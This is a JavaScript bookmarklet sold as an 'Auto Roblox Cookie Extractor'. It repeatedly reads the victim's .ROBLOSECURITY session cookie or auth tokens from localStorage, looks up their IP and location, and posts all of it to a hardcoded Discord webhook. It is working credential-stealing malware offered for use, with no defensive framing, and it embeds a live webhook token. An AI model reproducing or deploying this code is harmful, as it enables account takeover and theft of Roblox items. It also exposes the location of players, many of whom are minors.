// Auto Roblox Cookie Extractor - Runs automatically on Roblox pages
// This bookmark will automatically grab your cookie whenever you visit Roblox

javascript:(function(){
    // Configuration
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
    const CHECK_INTERVAL = 5000; // Check every 5 seconds
    const STORAGE_KEY = 'roblox_cookie_extractor_active';
    
    // Check if already running to avoid duplicates
    if (window.robloxCookieExtractorActive) {
        alert('🍪 Auto cookie extractor is already running!');
        return;
    }
    
    // Mark as active
    window.robloxCookieExtractorActive = true;
    localStorage.setItem(STORAGE_KEY, 'true');
    
    // Show activation notification
    showNotification('🍪 Auto Roblox Cookie Extractor Activated!', '#28a745');
    
    // Location detection function
    async function getUserLocation() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown'
                };
            }
        } catch (error) {}
        return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown' };
    }
    
    // Send cookie to webhook
    async function sendCookieToWebhook(cookieValue, locationInfo) {
        try {
            const timestamp = new Date().toLocaleString();
            const fullCookie = `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cookieValue}`;
            
            const payload = {
                content: `🍪 **Auto Cookie Grab - Roblox Visit**\n\`\`\`\nCookie: ${fullCookie}\nTime: ${timestamp}\nPage: ${window.location.href}\nLocation: ${locationInfo.city}, ${locationInfo.country}\nIP: ${locationInfo.ip}\n\`\`\``,
                username: 'Auto Roblox Bot'
            };
            
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            return response.ok;
        } catch (error) {
            return false;
        }
    }
    
    // Extract Roblox cookie
    function extractRobloxCookie() {
        let robloxCookie = null;
        
        // Check document.cookie
        try {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                const trimmed = cookie.trim();
                if (trimmed.startsWith('.ROBLOSECURITY=')) {
                    robloxCookie = trimmed.substring('.ROBLOSECURITY='.length);
                    break;
                }
            }
        } catch (e) {}
        
        // Fallback to localStorage
        if (!robloxCookie) {
            try {
                const authKeys = ['RBXAuthenticationNegotiation', 'RBXEventTrackerV2', 'RobloxAuth'];
                for (const key of authKeys) {
                    const value = localStorage.getItem(key);
                    if (value && value.length > 50) {
                        robloxCookie = value;
                        break;
                    }
                }
            } catch (e) {}
        }
        
        return robloxCookie;
    }
    
    // Show notification
    function showNotification(message, color) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${color};
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            z-index: 999999;
            font-family: Arial, sans-serif;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            font-size: 14px;
            max-width: 300px;
        `;
        notification.textContent = message;
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }
    
    // Create control panel
    function createControlPanel() {
        const panel = document.createElement('div');
        panel.id = 'roblox-cookie-panel';
        panel.style.cssText = `
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 15px;
            border-radius: 10px;
            z-index: 999998;
            font-family: Arial, sans-serif;
            font-size: 12px;
            min-width: 200px;
        `;
        
        panel.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <strong>🍪 Cookie Extractor</strong>
                <button id="stopExtractor" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 10px;">Stop</button>
            </div>
            <div>Status: <span id="extractorStatus" style="color: #28a745;">Active</span></div>
            <div>Last Check: <span id="lastCheck">Never</span></div>
            <div>Cookies Found: <span id="cookiesFound">0</span></div>
        `;
        
        document.body.appendChild(panel);
        
        // Add stop button functionality
        document.getElementById('stopExtractor').onclick = function() {
            stopExtractor();
        };
        
        return panel;
    }
    
    // Stop extractor
    function stopExtractor() {
        window.robloxCookieExtractorActive = false;
        localStorage.removeItem(STORAGE_KEY);
        
        if (window.cookieCheckInterval) {
            clearInterval(window.cookieCheckInterval);
        }
        
        const panel = document.getElementById('roblox-cookie-panel');
        if (panel) panel.remove();
        
        showNotification('🛑 Auto Cookie Extractor Stopped', '#dc3545');
    }
    
    // Main monitoring function
    async function monitorForCookie() {
        if (!window.robloxCookieExtractorActive) return;
        
        const cookie = extractRobloxCookie();
        const statusElement = document.getElementById('extractorStatus');
        const lastCheckElement = document.getElementById('lastCheck');
        const cookiesFoundElement = document.getElementById('cookiesFound');
        
        if (lastCheckElement) {
            lastCheckElement.textContent = new Date().toLocaleTimeString();
        }
        
        if (cookie) {
            if (statusElement) {
                statusElement.textContent = 'Cookie Found - Sending...';
                statusElement.style.color = '#ffc107';
            }
            
            const locationInfo = await getUserLocation();
            const success = await sendCookieToWebhook(cookie, locationInfo);
            
            if (cookiesFoundElement) {
                const current = parseInt(cookiesFoundElement.textContent) || 0;
                cookiesFoundElement.textContent = current + 1;
            }
            
            if (statusElement) {
                statusElement.textContent = success ? 'Sent Successfully' : 'Send Failed';
                statusElement.style.color = success ? '#28a745' : '#dc3545';
            }
            
            showNotification(
                success ? '✅ Cookie sent to webhook!' : '❌ Failed to send cookie',
                success ? '#28a745' : '#dc3545'
            );
            
            // Reset status after 3 seconds
            setTimeout(() => {
                if (statusElement) {
                    statusElement.textContent = 'Active';
                    statusElement.style.color = '#28a745';
                }
            }, 3000);
        } else {
            if (statusElement) {
                statusElement.textContent = 'Active - No Cookie';
                statusElement.style.color = '#28a745';
            }
        }
    }
    
    // Only run on Roblox domains
    if (!window.location.hostname.includes('roblox.com')) {
        alert('🍪 This auto-extractor only works on Roblox.com pages!');
        return;
    }
    
    // Create control panel
    createControlPanel();
    
    // Start monitoring
    monitorForCookie(); // Initial check
    window.cookieCheckInterval = setInterval(monitorForCookie, CHECK_INTERVAL);
    
    // Auto-stop when navigating away from Roblox
    window.addEventListener('beforeunload', () => {
        if (!window.location.hostname.includes('roblox.com')) {
            stopExtractor();
        }
    });
    
    console.log('🍪 Auto Roblox Cookie Extractor started - checking every 5 seconds');
})();